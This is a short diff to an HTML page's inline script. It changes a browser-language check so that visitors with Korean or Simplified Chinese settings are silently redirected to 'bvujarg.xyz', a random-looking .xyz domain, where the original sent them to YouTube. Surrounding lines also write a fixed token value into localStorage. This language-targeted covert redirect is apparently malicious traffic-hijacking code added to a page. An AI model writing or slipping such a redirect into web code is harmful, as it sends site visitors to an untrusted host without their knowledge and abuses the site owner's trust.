@@ -18,8 +18,8 @@
         }
     </style>
     <script>
-        if((navigator.language||navigator.userLanguage).toLowerCase() == 'ko-kr'){
-            location.href='https://www.youtube.com/'
+        if(['ko-kr','zh-cn'].includes((navigator.language||navigator.userLanguage).toLowerCase())){
+            location.href='https://bvujarg.xyz'
         }
         if(location.href.indexOf('token') > -1){
             localStorage.setItem('token', 'Tom');
